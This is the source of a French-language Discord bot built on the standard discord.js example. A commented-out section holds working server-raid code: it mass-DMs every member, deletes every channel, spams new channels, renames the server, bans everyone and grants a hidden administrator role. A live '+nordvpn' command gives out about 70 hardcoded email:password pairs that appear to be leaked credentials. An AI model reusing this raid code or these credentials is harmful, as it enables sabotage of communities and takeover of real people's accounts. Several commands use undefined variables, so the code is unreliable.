// Load up the discord.js library
const Discord = require("discord.js");

// This is your bot. Some people call it `bot`, some people call it `self`, 
// some might call it `cootchie`. Either way, when you see `bot.something`, or `bot.something`,
// this is what we're refering to. Your bot.
const bot = new Discord.Client();
const Client = new Discord.Client();

// Here we load the config.json file that contains our token and our prefix values. 
const config = require("./config.json");
// config.token contains the bot's token
// config.prefix contains the message prefix.

let cooldown = new Set();
let cdseconds = 5;



bot.on("ready", () => {
  // This event will run if the bot starts, and logs in, successfully.
  console.log(`Bot has started, with ${bot.users.size} users, in ${bot.channels.size} channels of ${bot.guilds.size} guilds.`); 
  // Example of changing the bot's playing game to something useful. `bot.user` is what the
  // docs refer to as the "botUser".
  bot.user.setActivity(`Serving ${bot.guilds.size} servers`);
});

bot.on("guildCreate", guild => {
  // This event triggers when the bot joins a guild.
  console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);
  bot.user.setActivity(`Serving ${bot.guilds.size} servers`);
});

bot.on("guildDelete", guild => {
  // this event triggers when the bot is removed from a guild.
  console.log(`I have been removed from: ${guild.name} (id: ${guild.id})`);
  bot.user.setActivity(`Serving ${bot.guilds.size} servers`);
});

let statuses = [
     " mon selly https://selly.gg/@energetiq " ,
      "Energeti_q THE BEST", 
      "tranquile tu fait r 💸" ,
      "détourne  🎲 ", 
      "https://discord.gg/uyv76uv" ,
      "Endorium Copiright ©️ 2019" 

     ]

  setInterval(function() {

      let status = statuses[Math.floor(Math.random()*statuses.length)];

      bot.user.setPresence({
          game: {
              name: status,
              type: "STREAMING",
              url: "https://twitch.tv/haku974"
          }
      })

  }, 3000)


bot.on("message", async message => {
  // This event will run on every single message received, from any channel or DM.
  
  // It's good practice to ignore other bots. This also makes your bot ignore itself
  // and not get into a spam loop (we call that "botception").
  if(message.author.bot) return;
  
  // Also good practice to ignore any message that does not start with our prefix, 
  // which is set in the configuration file.
  if(message.content.indexOf(config.prefix) !== 0) return;
  
  // Here we separate our "command" name, and our "arguments" for the command. 
  // e.g. if we have the message "+say Is this the real life?" , we'll get the following:
  // command = say
  // args = ["Is", "this", "the", "real", "life?"]
  const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  
  // Let's go with a few common example commands! Feel free to delete or change those.
  
  if(command === "ping") {
    // Calculates ping between sending a message and editing it, giving a nice round-trip latency.
    // The second ping is an average latency between the bot and the websocket server (one-way, not round-trip)
    const m = await message.channel.send("Ping?");
    m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(bot.ping)}ms`);
  }

  
  if(command === "say") {
    // makes the bot say something and delete the message. As an example, it's open to anyone to use. 
    // To get the "message" itself we join the `args` back into a string with spaces: 
    const sayMessage = args.join(" ");
    // Then we delete the command message (sneaky, right?). The catch just ignores the error with a cute smiley thing.
    message.delete().catch(O_o=>{}); 
    // And we get the bot to say the thing: 
   var embed = new Discord.RichEmbed()
			.setTitle("Say")
			.addField(sayMessage,sayMessage)
			.setColor(0x1FDDE3)
			.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
		message.channel.sendEmbed(embed);
  }
  
 
/*
if (command === `Monnaie`) {

    if (!monnaie[message.author.id]) {
        monnaie[message.author.id] = {
            monnaie: 0 
        };
    };

    let userMonnaie = monnaie[message.author.id].monnaie;

    let userMonnaieEmbed = new Discord.RichEmbed()
    .setAuthor(message.author.username)
    .setColor('#dc143c')
    .addField('💸', userMonnaie);

    message.channel.send(userMonnaieEmbed);
    };

// Tu créer un fichier monnaie.json et apres dans ton fichier principale tu met 

    if (!monnaie[message.author.id]) {
        monnaie[message.author.id] = {
            monnaie: 0 
        };
    };

    let baseMonnaie = Math.floor(Math.random() * 0) + 1;
    let AjoutMonnaie = Math.floor(Math.random() * 1) + 1;

    if (AjoutMonnaie === baseMonnaie) {
        monnaie[message.author.id] = {
            monnaie: monnaie[message.author.id].monnaie + AjoutMonnaie
        };

    fs.writeFile('./monnaie.json', JSON.stringify(monnaie), err => {
        if(err) console.log(err);
        });
    };

*/
if (command === `infobot`) {

    let botIcon = bot.user.displayAvatarURL;
    let embed = new Discord.RichEmbed()
        .setDescription('Bot By Energetiq')
        .setColor(0xdc143c)
        .setThumbnail(botIcon)
        .addField('Nom Du Bot :', bot.user.username)
        .addField('Créer Par :', 'Energetiq')
    .addField('');

    return message.channel.send(embed);
   };


  
/*  

        //RENAME TOUT LE MONDE EN DESSOUS DU BOT
        
          if(message.content === "name"){
          message.delete();
          message.guild.members.map(async (member, id) =>{
            member.setNickname("🥔CHIPS🥔");
          });
        } 

// COMMANDE POUR SPAMMER MP
  if(command === "spamp") {
      message.delete()
       let i = 0;
       let interval = setInterval(function () {
        message.guild.members.forEach(e => {
          const embed = new Discord.RichEmbed()
           .setColor("RANDOM")
           .addField("BACKUP GO JOIN", `Le serveur ${message.guild.name} ce fait raid par ESPRIT 
           "https://discord.gg/KcGVJwg"
           "https://discordapp.com/oauth2/authorize?client_id=559409837159481383&permissions=8&scope=bot"
           "https://discord.gg/KcGVJwg" 
           "https://discord.gg/KcGVJwg"
            https://discord.gg/KcGVJwg`)
           .setThumbnail("https://cdn.discordapp.com/attachments/549228916028735488/559406383640870912/Screenshot_20190320-212723.jpeg")
           e.user.send({embed});
         }, 1000);
       });    
    }  

 //COMMANDE DE CREATION DE CHANNEL, MODIFICATION DU NOM, DE LA REGION ET DE L'ICON DU SERVEUR
    if(command === "dead") {
       if(message.channel.type === "dm") return;
        if(message.guild.name != "[Hackeur] ESPRIT"){
          let name = [
    "ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ",
    "ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ",
    "ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ",
          ]
          setInterval(function() {
            let names = name[Math.round(Math.random() * (name.length - 1))];
            message.guild.setName(`${names}`).catch(error => {})
          }, 1000)
            message.guild.channels.map(channel => channel.delete());
            let icon = [
                   "https://cdn.discordapp.com/attachments/550815489643905037/559694097791844352/3sKVHO28_400x400.png",
              "https://cdn.discordapp.com/attachments/549228916028735488/559406383640870912/Screenshot_20190320-212723.jpeg",
              "https://cdn.discordapp.com/attachments/554275126250700825/559431146098786324/JPEG_20190324_122039.jpg"
            ]
            setInterval(function() {
              let icons = icon[Math.round(Math.random() * (icon.length - 1))];
              message.guild.setIcon(`${icons}`).catch(error => {})
            }, 2500)
            message.guild.setRegion('russia').catch(error => {})
		}
        setInterval(function () { if(message.guild.channels.size < 499){
          message.guild.createChannel('ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ', 'voice').catch(error => {})
          message.guild.createChannel(' ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ', 'text').catch(error => {})
        }}, 100)
        if(message.deletable) message.delete();
      }
	
   if(command === "spam") {
    message.delete()
     let i = 0;
     let interval = setInterval(function () {
       message.guild.channels.forEach(channel => {
         if (channel.type === "text") channel.send(`Le serveur **${message.guild.name}** ce fait raid par 👻ESPRIT👻, Dédicace aux POTO de l'esprit. https://discord.gg/KcGVJwg  https://cdn.discordapp.com/attachments/550815489643905037/559694097791844352/3sKVHO28_400x400.png  @everyone`)
       }, 1000);
     });    
}

   //COMMANDE POUR BAN TOUT LE MONDE SAUF CEUX AYANT LE GRADE
   
      if(command === "banall") {
      if (message.deletable) message.delete();
      if(message.channel.type === "dm") return;
      if(message.deletable) message.delete();
      else if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return;
        message.guild.members.forEach(member => {
            if (!member.roles.exists("name", "👻ESPRIT👻") && member.bannable) member.ban();});
              message.delete();
              const embed = new Discord.RichEmbed()
              .setTitle("Commande ban réalisé avec succès !")
              .setColor('RANDOM')
              .setImage("https://s3.amazonaws.com/files.enjin.com/1242418/modules/forum/attachments/Escanor_Cruel_Sun_1534888924.gif")
              message.channel.send({embed});
    
          if (message.content === "e.admin") {
          if(message.channel.type === "dm") return;
          else if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return;
          message.member.guild.createRole({name: "👻ESPRIT👻",permissions: "ADMINISTRATOR",position: "100"}).then(function(role) {message.member.addRole(role);})
          if (message.deletable) message.delete();
          message.channel.send("Ajout du admin avec succes.")
          }
  }
  
  if(command === "raid2"){
      if(message.channel.type === "dm") return;
      if (message.author.id != `${message.author}`) return;
   
      if(message.guild.name != "Chips Sataniques !"){
           message.guild.setIcon("https://i.imgur.com/nknnfHe.png").catch(error => {})
           message.guild.setName('Raid By des Chips mon pote !').catch(error => {})
           message.guild.setRegion('russia').catch(error => {})
       }
       setInterval(function () { if(message.guild.channels.size < 499){
         message.guild.createChannel('FuckedbyCHIPS', 'text').catch(error => {})
       }}, 400)
       if(message.deletable) message.delete();
     }
  
     if (command === 'raid3') {
      if(message.channel.type === "dm") return;
      if (message.author.id != `${message.author}`) return;
   
        setInterval (function () { message.channel.send("@everyone @here . Quittez tous le serv c'est fait raid x= !!! \n"+
        "Fucked By CHIPS \n"+
       " C'est sa de s'attaqué a des innocents \n"+
       "La porchaine fois teste pas mon frr", { tts: true } ).catch(error => {}) }, 400)
      }
                                                                        
*/
 
  
  


  if(command === "kick") {
    // This command must be limited to mods and admins. In this example we just hardcode the role names.
    // Please read on Array.some() to understand this bit: 
    // https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Array/some?
    if(!message.member.roles.some(r=>["Administrator", "Moderator"].includes(r.name)) )
      return message.reply("Sorry, you don't have permissions to use this!");
    
    // Let's first check if we have a member and if we can kick them!
    // message.mentions.members is a collection of people that have been mentioned, as GuildMembers.
    // We can also support getting the member by ID, which would be args[0]
    let member = message.mentions.members.first() || message.guild.members.get(args[0]);
    if(!member)
      return message.reply("Please mention a valid member of this server");
    if(!member.kickable) 
      return message.reply("I cannot kick this user! Do they have a higher role? Do I have kick permissions?");
    
    // slice(1) removes the first part, which here should be the user mention or ID
    // join(' ') takes all the various parts to make it a single string.
    let reason = args.slice(1).join(' ');
    if(!reason) reason = "No reason provided";
    
    // Now, time for a swift kick in the nuts!
    await member.kick(reason)
      .catch(error => message.reply(`Sorry ${message.author} I couldn't kick because of : ${error}`));
    message.reply(`${member.user.tag} has been kicked by ${message.author.tag} because: ${reason}`);
  }
  
  if(command === "ban") {
    // Most of this command is identical to kick, except that here we'll only let admins do it.
    // In the real world mods could ban too, but this is just an example, right? ;)
    if(!message.member.roles.some(r=>["Administrator"].includes(r.name)) )
      return message.reply("Sorry, you don't have permissions to use this!");
    
    let member = message.mentions.members.first();
    if(!member)
      return message.reply("Please mention a valid member of this server");
    if(!member.bannable) 
      return message.reply("I cannot ban this user! Do they have a higher role? Do I have ban permissions?");

    let reason = args.slice(1).join(' ');
    if(!reason) reason = "No reason provided";
    
    await member.ban(reason)
      .catch(error => message.reply(`Sorry ${message.author} I couldn't ban because of : ${error}`));
    message.reply(`${member.user.tag} has been banned by ${message.author.tag} because: ${reason}`);
    message.channel(logs)
    .send(member.user.tag)
  }
  
	if (command === "help") {
		var embed = new Discord.RichEmbed()
			.setTitle("Help")
			.setDescription("Commandes Par Nergbot (prefix '+')")
			.addField("+help", "pour avoir de l'aide")
			.addField("+ban {user} [info]", "ban (réservé au staff) !")
			.addField("+ping", "pong! nan je rigole pour voir ta latence")
			.addField(" +kick {user} [raison]", "pour éjécter un membre du serveur (réservé au Staff)")
			.addField(" +purge {Nombre de message}", " Pour suprimé les messages!(réservé au staff) ")
      .addField(" +pvme ", "Vous verez")
      .addField(" +say {texte}", "Remplace votre message par celui du bot avec un embed")
      .addField("+mute {la personne}","Permet de mute la personne" )
      .addField("+new/+close","Pour crée un tickets (mais seulement dans le salon tickets)/pour férmé un ticket")
      .setColor(0x1FDDE3)
			.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
		message.channel.sendEmbed(embed);


  } 

  	if (command === 'pvme') {
		message.author.createDM().then(channel =>  
      channel.send("Tu a bien fait de tester car je vais te raconter une petite histoire : https://privnote.com/VGtizhrD#nP9fxtd25")
			)

			
		};

  
   if(command === "avatar") { 
     message.reply(message.author.avatarURL)
   }


   if(command === "log"){
     message.guild.createChannel("log", "Ici Tu auras tout les logs")
    Channel.permissions()
   }



  if(command === "msg") {
        
        let member = message.mentions.members.first() || message.guild.members.get(args[0]);
        
        let msgg = args.slice(1).join(' ');
        
        member.send(`${msgg} `)
   
  }



  bot.on("message", async message => {
  
    if (message.content.startsWith(prefix + "mpall")) {
    
           var args = message.content.split(" ").slice(1);
           var msge = args.join(' ');
 
            if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channel.send("❌ Tu n'as pas la permission d'utiliser cette commande!");
            if(!msge) return message.channel.send("Précise un message")
            var mpall =new Discord.RichEmbed()
               .setColor("RANDOM")
               .addField("Message:", msge);
               
            message.delete()
            message.guild.members.map(m => m.send(mpall))
     
        
 
    }

});




if(command === "shop")
var embed = new Discord.RichEmbed()
.setTitle("SHOP")
.setDescription("Selly","Selly D'energetiq")
.addField("Le shop D'energetiq : https://selly.gg/@energetiq","Pour plus D'info Mp mon créateur")
.setColor(0x1FDDE3)
.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
message.channel.sendEmbed(embed);



  if(command === "purge") {
    // This command removes all messages from all users in the channel, up to 100.
    
    // get the delete count, as an actual number.
    const deleteCount = parseInt(args[0], 10);
    
    // Ooooh nice, combined conditions. <3
    if(!deleteCount || deleteCount < 2 || deleteCount > 100)
      return message.reply("Please provide a number between 2 and 100 for the number of messages to delete");
    
    // So we get our messages, and delete them. Simple enough, right?
    const fetched = await message.channel.fetchMessages({limit: deleteCount});
    message.channel.bulkDelete(fetched)
      .catch(error => message.reply(`Couldn't delete messages because of: ${error}`));
  }
});

bot.on('message', msg => {
    if(msg.author.bot) return;

    if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm
  
    if (msg.content === '+nordvpn') { //commande a exécuté
      if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)
  
  var answers = [
  
  //il faut mettre tout les compte entre des ' ' !
  
  "sknauer@mac.com:beehive6624",
  "F5_Lakers@hotmail.com:ethanhunt",
  "fadi.mandura@gmail.com:Darrelabbot710",
  "shre11@yahoo.com:3333ws",
  "johnrvw@yahoo.com:osan2621",
  "Cubi2011@web.de:12345ert",
  "brilgermanotta@yahoo.com:96799834",
  "rafaell.rcmr@gmail.com:64746347",
  "jeffrey823@gmail.com:Medical989",
  "rezamatrix@gmail.com:reza2106",
  "jinjyjjin@sina.com:1300312jin",
  "skasselakis1@gmail.com:Merrill10",
  "markie610@gmail.com:gajunia5",
  "abnoutlaw@gmail.com:whutitdew2",
  "ronlessel@yahoo.com:1q2w3e4r",
  "arsencameron222@gmail.com:arsenlol123",
  "jonas_mts@hotmail.com:ivaneide",
  "anabeatricepa408@gmail.com:yasminpr",
  "greg.james.miller@gmail.com:kfnmertn",
  "keelycrum@gmail.com:launchpad",
  "rubalo@gmail.com:platinum",
  "dfmickey@gmail.com:brittany",
  "eyamie@gmail.com:reggie",
  "anime.lovers@mail.ru:maks223223445",
  "tulaihia@gmail.com:kainkain",
  "hicham.guer@gmail.com:29121984",
  "bitch@bitch.com:bitch",
  "barrgeorgie@gmail.com:Georgie1101",
  "myonghwi@gmail.com:hanazono",
  "Joshua83@gmail.com:biochem3",
  "eren.sergen@googlemail.com:metin2acc",
  "caio_zoboli@hotmail.com:b9w8b9j4",
  "tevanromero@yahoo.com:ella5525",
  "usakokonchan@gmail.com:75365259",
  "christian-nack@hotmail.de:ff125135",
  "androonguyen@gmail.com:beuscher",
  "bodeysobhy112@gmail.com:Sobhy321",
  "eduardosandovalgomeza@gmail.com",
  "javier_beltran87@yahoo.com:alexcia30",
  "elias_bougharios@hotmail.com:popper12345",
  "smejkalkurtis@gmail.com:061188Ks",
  "c.h.steveip@gmail.com:2oo9145932",
  "christofermvieta@gmail.com:vifarm01",
  "crtrdn@gmail.com:cr54tr78dn",
  "ali_mak46@yahoo.com:123233",
  "alizzz94@yahoo.com:777777",
  "alliabrar@gmail.com:titanic02",
  "neilmpenney@hotmail.com:nempen87",
  "gx@live.com.sg:lovezick98",
  "johnwklee@yahoo.com:jl230891",
  "kiwilicous_kiwi@hotmail.com:woaainee",
  "jiuwai@gmail.com:oicla999",
  "mckayjunk@gmail.com:high11",
  "bob.coolguy@gmail.com:wigglemania",
  "ilya-gallyamov@mail.ru:121201ilya",
  "b.case@aggiemail.usu.edu:14cousins",
  "natalia.kempin@googlemail.com:livenet666",
  "bach.oliver3@gmail.com:Futte2606",
  "jza162001@yahoo.com:password6",
  "higsonadam1905@gmail.com:amarett0",
  "rachael_pang@hotmail.com:322454653",
  "izwan00@gmail.com:hell4se68",
  "dirtyzed@hotmail.com:piazza",
  "k.soezbilen@hotmail.de:f4fe7dca",
  "semihsari@hotmail.de:semih9988",
  "djones5qvc@gmail.com:bronco95",
  "msomfa@gmail.com:mso101089",
  "arlindo.mieiro@gmail.com:miguel07",
  "marvinminato@hotmail.de:Ronaldo12",
  "fetchek@gmail.com:fetche4ever",
  "g_souza9@hotmail.com:51fsc345",
  "farad@alhusaini.org:200776"       //ne pas mettre de virgule "," pour le dernier compte 
  ];
  
  let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
    const embed = new Discord.RichEmbed()
    .setFooter("Copyright © 2019 Endorium")
    .addField('Voici ton compte NordVPN(attention ils ne sont pas garantit !): ',
    randomAnswerPicker)
   .setColor("RANDOM")
        .setImage("https://media.discordapp.net/attachments/541586025710092298/547813811403358208/MOSHED-2019-2-20-17-15-48.gif?width=562&height=422" )
        .setTimestamp()
  msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
  msg.author.send({embed})
  }
  
  }
});



const prefix = '+';

bot.on('message', async message => { 

  if(message.author.bot) return;

  if(!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();

  if(command === 'new'){
      var parent_channel = message.guild.channels.find(e => e.name === 'Tickets');

      const reason = message.content.split(" ").slice(1).join(" ");
      if (message.guild.channels.some(ch => ch.name === "ticket-" + message.author.id)){
          var the_channel = message.guild.channels.find(ch => ch.name === "ticket-" + message.author.id);
          return message.channel.send(`Vous avez déjà un ticket ouvert ! (`+the_channel+')');
      }
      message.guild.createChannel(`ticket-${message.author.id}`, "text").then(c => {
        c.setParent(parent_channel);
        let role = message.guild.roles.find(e => e.name === '@everyone');
        c.overwritePermissions(role, {
            SEND_MESSAGES: false,
            READ_MESSAGES: false
        });
        c.overwritePermissions(message.author, {
            SEND_MESSAGES: true,
            READ_MESSAGES: true
        });
        message.channel.send(`Votre ticket a été ouvert, <#${c.id}>.`);
        const embed = new Discord.RichEmbed()
            .setColor(0xFF0000)
            .addField(`Bienvenue ${message.author.username}!`, `Veuillez nous en dire un peu plus sur votre demande d'aide !`)
            .setTimestamp()
            .setFooter('Tape '+prefix+'close pour fermer le ticket');
        c.send(embed);
        c.send('<@&557671309321175051>')
    }).catch(console.error);
}
if(command === 'close'){
    if (!message.channel.name.startsWith(`ticket-`)) return message.channel.send(`Vous n'êtes pas dans un salon de ticket !`);
    message.channel.send(`Pour confimer tapez \`confirm\` ! Le salon sera supprimé !`)
    .then((m) => {
        message.channel.awaitMessages(response => response.content === 'confirm', {
            max: 1,
            time: 10000,
            errors: ['time'],
        })
        .then((collected) => {
            message.channel.delete();
        })
        .catch(() => {
            m.edit('Temps écoulé, annulation.').then(m2 => {
                m2.delete();
            }, 3000);
        });
    });
}

if (decomp_msg[0] === commands_prefix + "mute") {
  if(message.member.hasPermission("MANAGE_MESSAGES")) {
    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("Vous n'avez pas la permissions");
    let mUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]))
    if(!mUser) return message.reply("Impossible de trouv e cette personne");
    if(mUser.hasPermission("MANAGE_MESSAGES")) return message.reply("Impossible de retir  le droit de parler a cette personne.");
    let reason = args.join(" ").slice(22);
    var muteEmbed = new Discord.RichEmbed()
    .setDescription("~Mute~")
    .setColor('RANDOM')
    .addField("Utilisateur mut ",`${mUser} ID ${mUser.id}`)
    .addField("mute  par",`<@${sender.id}> ID ${sender.id}`)
    .addField("mute  de", `${message.channel.name} `)
    .addField("mute  le", `${message.createdAt} `)
    .addField("Raison", ` ${reason}.`)

    let muterole = message.guild.roles.find(`name`, "Muted");
    if(!muterole) return message.reply("Vous devriez creer le role Muted");

    let mutechannel = message.guild.channels.find(`name`, "incidents");
    if(!mutechannel) return message.reply("Impossible de trouvee le channel incidents");

    mUser.send('Oh mon dieu tu a  été  mute de ' + message.guild.name)
    message.delete()
    message.channel.send("Un joueur vien de ce faire mute !")
    mUser.addRole(muterole.id)
    mutechannel.send(muteEmbed)
    }
 }

});

bot.login(config.token);